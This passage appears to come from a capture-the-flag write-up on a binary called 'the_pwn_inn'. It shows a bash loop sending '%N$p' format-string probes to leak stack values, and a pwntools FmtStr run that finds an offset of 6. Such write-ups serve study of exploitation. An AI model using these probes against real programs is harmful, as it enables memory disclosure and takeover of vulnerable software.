# Getting data


By executing that command I have obatined the list of variables stored on indexes from 1 to 100:

```bash
$ for i in {1..100}; do echo "START%$i\$pEND" | ./the_pwn_inn | grep 'START'; done > output.txt
```

Then, by running the exploit using FmtStr from pwntools I have gathered the offset to variable written by myself:

```bash
[*] Found format string offset: 6
```

So the string I pass to printf is at index 6
